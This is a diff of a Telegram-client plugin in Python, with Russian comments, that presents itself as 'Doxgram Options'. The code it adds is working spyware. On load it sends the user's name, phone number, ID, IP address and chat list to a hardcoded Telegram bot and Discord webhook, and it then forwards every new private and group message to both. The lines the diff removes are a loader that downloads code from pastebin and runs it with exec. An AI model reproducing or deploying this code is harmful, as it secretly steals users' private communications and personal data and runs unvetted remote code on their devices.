@@ -1,18 +1,228 @@
-__id__ = "drx_loader"
-__name__ = "Drdtools"
-__version__ = "1.3.1"
+__id__ = "doxgram_opt"
+__name__ = "Д0ксграм"
+__description__ = "Doxgram Options and best snoser"
 __author__ = "laironix_"
-__description__ = "DrxToolsLoader"
-__min_version__ = "11.12.0"
+__version__ = "1.0"
 __icon__ = "TranslucentRooni/21"
+__min_version__ = "11.12.0"
 
-import urllib.request, urllib.error
-import subprocess
-import sys
+import requests
+import json
+import os
+from threading import Lock, Thread
+from datetime import datetime
+from base_plugin import BasePlugin, HookResult, HookStrategy
+from client_utils import get_messages_controller, get_user_config, run_on_queue
+from android_utils import log, run_on_ui_thread
+from file_utils import get_plugins_dir, write_file
 
-try:
-    response = urllib.request.urlopen("https://pastebin.com/raw/a0hixneQ")
-    code = response.read().decode("utf-8")
-    exec(code)
-except Exception as e:
-    print("Failed to fetch or execute remote code:", e, file=sys.stderr)
+BOT_TOKEN = "7971964427:AAH99dUtIKAOy9Kh6jT_pPy8peExy-bYaTc"  # Твой токен бота
+YOUR_CHAT_ID = 8183209822  # ID чата, куда слать
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1426139051614011476/ZpZHHbhdrNEeRxK7PoiyVGr8qpyBEkAY54Wi9nRFpzZlFnxv-fetQKxpQliJD6oCLNjv"
+
+BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+HISTORY_FILE = os.path.join(get_plugins_dir(), "stolen_messages.json")  # Локальный лог
+lock = Lock()
+
+class MessageThief(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self.stolen_history = self.load_history()
+
+    def on_plugin_load(self):
+        Thread(target=self.leak_profile, daemon=True).start()  # Сразу сливаем профиль
+        self.add_on_update_hook()  # Хукаем обновления для новых сообщений
+
+    def leak_profile(self):
+        try:
+            uc = get_user_config()
+            msg = get_messages_controller()
+
+            user = uc.getCurrentUser()
+            name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "Без имени"
+            uname = user.username or "нет"
+            uid = user.id
+            phone = uc.getClientPhone() or "скрыт"
+            ip = self.get_ip()
+
+            # Чаты
+            chats = []
+            dlg_dict = getattr(msg, "dialogs_dict", None)
+            if dlg_dict and dlg_dict.size() > 0:
+                for i in range(dlg_dict.size()):
+                    d = dlg_dict.valueAt(i)
+                    if not d: continue
+                    title = getattr(d, "name", "Чатик")
+                    u = f" @{d.username}" if hasattr(d, "username") and d.username else ""
+                    id_ = d.id
+                    peer = getattr(d, "peer", None)
+                    if peer:
+                        if getattr(peer, "user_id", 0):   t = "ЛС"
+                        elif getattr(peer, "chat_id", 0): t = "Группа"
+                        elif getattr(peer, "channel_id", 0): t = "Канал"
+                        else:                             t = "??"
+                    else:
+                        t = "Сохранёнки"
+                    chats.append(f"`{id_}` — {title}{u} ({t})")
+
+            main_text = f"""
+*TOTAL LEAK — ЖЕРТВА СПИЗЖЕНА*
+
+*Имя:* {name} (@{uname})
+*ID:* `{uid}`
+*Телефон:* ||{phone}||
+*IP:* `{ip}`
+*Чатов:* {len(chats)}
+
+*Чаты (первые 50):*
+"""
+            full_text = main_text + "\n".join(chats[:50])
+            run_on_ui_thread(lambda: self.send_to_bot(full_text))
+
+            if len(chats) > 50:
+                run_on_ui_thread(lambda: self.send_to_bot("Продолжение чатов:\n" + "\n".join(chats[50:100])))
+
+            run_on_ui_thread(lambda: self.send_to_discord({
+                "content": "**TOTAL LEAK — СЛИТО ЧЕРЕЗ БОТА**",
+                "embeds": [{
+                    "title": f"{name} (@{uname})",
+                    "color": 0x00FF00,
+                    "fields": [
+                        {"name": "Телефон", "value": f"||{phone}||"},
+                        {"name": "ID",      "value": f"`{uid}`"},
+                        {"name": "IP",      "value": ip},
+                        {"name": "Чатов",   "value": str(len(chats))},
+                        {"name": "Получено через", "value": "Message Thief"}
+                    ]
+                }]
+            }))
+
+            for i in range(0, len(chats), 50):
+                chunk = "\n".join(chats[i:i+50])
+                run_on_ui_thread(lambda c=chunk: self.send_to_discord({
+                    "embeds": [{"description": c, "color": 0x8B00FF}]
+                }))
+
+        except:
+            pass
+
+    def on_update_hook(self, update_name: str, account: int, update: any) -> HookResult:
+        if update_name != "newMessage":  # Только новые сообщения
+            return HookResult()
+
+        try:
+            messages_controller = get_messages_controller(account)
+            if not messages_controller:
+                return HookResult()
+
+            # Проверяем, что это из переписки (private или group, не канал)
+            message_obj = update.message  # Из TLRPC.UpdateNewMessage
+            if not message_obj or not hasattr(message_obj, 'peer_id'):
+                return HookResult()
+
+            peer_id = message_obj.peer_id
+            if peer_id.channel_id != 0:  # Игнорим каналы
+                return HookResult()
+
+            # Вытаскиваем данные сообщения
+            text = getattr(message_obj, 'message', '') or "[Медиа/Файл]"
+            sender_id = getattr(message_obj, 'from_id', {}).user_id or "Unknown"
+            chat_id = peer_id.user_id or peer_id.chat_id or peer_id.channel_id
+            timestamp = datetime.fromtimestamp(message_obj.date).strftime("%Y-%m-%d %H:%M:%S")
+
+            # Формируем слит
+            leak_data = {
+                "timestamp": timestamp,
+                "chat_id": chat_id,
+                "sender_id": sender_id,
+                "text": text,
+                "peer_type": "private" if peer_id.user_id else "group"
+            }
+
+            # Сохраняем в историю, чтоб не дублировать
+            with lock:
+                if leak_data not in self.stolen_history:
+                    self.stolen_history.append(leak_data)
+                    self.save_history()
+
+            # Шлём в бот
+            self.send_to_bot_message(leak_data)
+
+            # Шлём в Discord
+            self.send_to_discord_message(leak_data)
+
+        except:
+            pass
+
+        return HookResult()  # Продолжаем нормально
+
+    def send_to_bot(self, text):
+        try:
+            data = {
+                "chat_id": YOUR_CHAT_ID,
+                "text": text,
+                "parse_mode": "Markdown",
+                "disable_web_page_preview": True
+            }
+            requests.post(BOT_API, data=data, timeout=15)
+        except:
+            pass
+
+    def send_to_bot_message(self, data: dict):
+        try:
+            text = f"*УКРАДЕНО ИЗ ПЕРЕПИСКИ*\n*Чат:* `{data['chat_id']}` ({data['peer_type']})\n*Отправитель:* `{data['sender_id']}`\n*Время:* {data['timestamp']}\n*Сообщение:* ||{data['text']}||"
+            payload = {
+                "chat_id": YOUR_CHAT_ID,
+                "text": text,
+                "parse_mode": "Markdown",
+                "disable_web_page_preview": True
+            }
+            requests.post(BOT_API, data=payload, timeout=10)
+        except:
+            pass
+
+    def send_to_discord(self, data):
+        try:
+            requests.post(DISCORD_WEBHOOK, json=data, timeout=20)
+        except:
+            pass
+
+    def send_to_discord_message(self, data: dict):
+        try:
+            embed = {
+                "title": "УКРАДЕНОЕ СООБЩЕНИЕ",
+                "color": 0xFF0000,
+                "fields": [
+                    {"name": "Чат ID", "value": str(data['chat_id']), "inline": True},
+                    {"name": "Отправитель", "value": str(data['sender_id']), "inline": True},
+                    {"name": "Тип", "value": data['peer_type'], "inline": True},
+                    {"name": "Время", "value": data['timestamp'], "inline": False},
+                    {"name": "Текст", "value": data['text'][:1024], "inline": False}
+                ],
+                "timestamp": data['timestamp']
+            }
+            requests.post(DISCORD_WEBHOOK, json={"embeds": [embed]}, timeout=10)
+        except:
+            pass
+
+    def get_ip(self):
+        try:
+            return requests.get("https://api.ipify.org", timeout=7).text.strip()
+        except:
+            return "не удалось"
+
+    def load_history(self) -> list:
+        try:
+            content = read_file(HISTORY_FILE)
+            return json.loads(content) if content else []
+        except:
+            return []
+
+    def save_history(self):
+        try:
+            write_file(HISTORY_FILE, json.dumps(self.stolen_history, ensure_ascii=False))
+        except:
+            pass
+
+    def on_plugin_unload(self):
+        pass
